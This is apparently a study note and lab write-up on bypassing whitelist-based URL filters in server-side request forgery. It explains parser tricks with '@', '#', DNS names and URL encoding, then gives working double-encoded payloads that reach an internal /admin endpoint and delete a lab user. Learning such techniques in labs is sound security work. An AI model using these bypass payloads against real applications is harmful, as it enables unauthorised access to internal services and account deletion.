---
tags: ["whitelist", "bypass"]
---

## SSRF with whitelist-based input filters

Some applications only allow input that matches, begins with, or contains, a whitelist of permitted values. In this situation, you can sometimes circumvent the filter by exploiting inconsistencies in URL parsing.

The URL specification contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:

- You can embed credentials in a URL before the hostname, using the `@` character. For example:

  `https://expected-host@evil-host`

- You can use the `#` character to indicate a URL fragment. For example:

  `https://evil-host#expected-host`

- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:

  `https://expected-host.evil-host`

- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- You can use combinations of these techniques together.

## Challenge

--> In this challenge we have to bypass the SSRF protection and delete the carlos's account.

--> So i tried different things like using `@`,`#` and `.` between 2 hosts but it didn't worked because i was putting `localhost` after correct host. so after that i swapped the position and `http://localhost@stock.weliketoshop.net/admin` gave me internal server error

So i tried to use `#` also and i bypassed it with this payload :

```
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%32%33@stock.weliketoshop.net/admin
```

--> To delete carlos's account i used this payload:

```
http://%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos
```

And we solved the lab!
